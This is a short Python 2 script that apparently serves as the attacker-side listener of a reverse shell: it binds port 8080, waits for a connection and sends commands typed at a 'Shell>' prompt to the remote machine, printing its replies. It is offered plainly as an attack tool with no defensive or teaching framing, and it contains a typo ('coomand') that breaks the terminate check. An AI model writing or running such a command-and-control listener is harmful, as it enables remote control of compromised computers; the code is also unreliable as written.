import socket

def connect():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 8080))
    s.listen(1)

    print ('[+] Listening for incoming traffic from port 8080 ')

    conn, addr = s.accept()

    print ('[+] Connected to: ', addr)

    while True:
        command = raw_input("Shell> ")
        
        if 'terminate' in coomand:
            conn.send('terminate')
            conn.close()
            break
        else:
            conn.send(command)
            print (conn.recv(1024))


def main():
    connect()

main()


